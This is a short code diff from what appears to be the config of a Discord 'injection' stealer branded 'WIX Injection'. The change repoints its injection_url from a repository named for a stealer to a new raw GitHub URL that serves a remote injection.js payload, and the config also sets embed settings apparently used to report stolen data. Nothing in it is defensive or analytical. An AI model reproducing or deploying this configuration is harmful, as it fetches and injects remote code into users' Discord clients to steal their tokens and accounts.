@@ -14,7 +14,7 @@ const config = {
   embed_name: 'WIX Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1152970563141238824/1244267725468074014/logo.gif'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/wassimwix/dis_ing/main/injection.js', 
   /**
    
    **/
